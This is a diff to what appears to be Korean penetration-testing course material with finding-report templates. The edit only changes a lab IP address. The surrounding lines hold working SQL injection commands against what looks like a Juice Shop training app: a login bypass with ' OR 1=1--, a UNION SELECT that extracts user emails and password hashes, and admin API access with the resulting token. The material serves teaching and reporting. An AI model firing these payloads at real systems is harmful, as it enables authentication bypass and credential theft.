@@ -228,7 +228,7 @@ MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
 
 재현 단계:
   1. 로그인 API에 조작된 이메일 전송:
-     curl -X POST http://10.20.30.80:3000/rest/user/login \
+     curl -X POST http://10.20.40.81:3000/rest/user/login \
        -H "Content-Type: application/json" \
        -d '{"email":"'"'"' OR 1=1--","password":"a"}'
 
@@ -237,7 +237,7 @@ MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
 
   3. 토큰으로 관리자 API 접근:
      curl -H "Authorization: Bearer eyJ..." \
-       http://10.20.30.80:3000/api/Users/
+       http://10.20.40.81:3000/api/Users/
 
 증거:
   [스크린샷 1] SQL Injection 성공 응답
@@ -979,7 +979,7 @@ cat > /tmp/finding-F001.md << 'MD'
 | 발견일 | 2026-04-26 14:23 KST |
 | 검증일 | 2026-04-27 10:00 KST |
 | 보고자 | 학생 이름 |
-| 영향 시스템 | web (10.20.30.80:3000) |
+| 영향 시스템 | web (10.20.40.81:3000) |
 | 영향 컴포넌트 | /rest/products/search?q=* |
 | CWE | CWE-89 (SQL Injection) |
 | OWASP | A03:2021 Injection |
@@ -995,13 +995,13 @@ SQL 쿼리에 직접 삽입한다. 검증되지 않은 입력은 백엔드 SQLit
 ## 재현 단계
 \`\`\`bash
 # 1. 정상 요청
-curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | jq '.data | length'
+curl -s "http://10.20.40.81:3000/rest/products/search?q=apple" | jq '.data | length'
 
 # 2. SQL 메타문자 오류 확인
-curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'" | jq -r '.error'
+curl -s "http://10.20.40.81:3000/rest/products/search?q=apple'" | jq -r '.error'
 
 # 3. UNION SELECT 추출
-curl -s "http://10.20.30.80:3000/rest/products/search?q=')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"
+curl -s "http://10.20.40.81:3000/rest/products/search?q=')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"
 \`\`\`
 
 ## 영향
